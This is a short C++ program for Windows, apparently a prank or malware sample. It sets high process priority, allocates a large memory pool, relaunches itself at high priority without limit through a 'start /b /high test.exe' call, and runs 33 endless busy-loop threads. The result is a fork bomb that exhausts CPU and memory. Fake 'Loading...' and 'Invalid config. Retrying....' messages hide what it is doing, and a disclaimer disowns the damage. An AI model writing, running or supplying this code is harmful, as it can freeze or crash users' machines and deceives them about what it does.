#include <iostream>
#include <thread>
#include <Windows.h>

void Loop()
{
	int* vars = new int[1024];
	while (true)
	{
		for (int val = 0; val < 10'000; val++)
		{
			for (int i = 0; i < 1024; i++)
			{
				vars[i] = val;
			}
		}
	}
}

int main(int argc, char** argv)
{
	if (argc == 1)
	{
		SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
		std::cout << "Make sure you have at least minimum system requirements!\nCreator not responsible for damage caused by improper use!!\nPress any key to continue";
		std::cin.get();
	}

	std::cout << "Loading...\n";
	long long* memPool = new long long[50'000'000];
	system("start /b /high test.exe 5");

	if (argc > 1)
	{
		std::cout << "Invalid config. Retrying....\n";
		while (true)
			memPool[500] = 60;
	}

	std::thread* ts = new std::thread[33];

	for (int i = 0; i < 33; i++)
		ts[i] = std::thread(Loop);

	for (int i = 0; i < 33; i++)
		ts[i].join();
	return 0;
}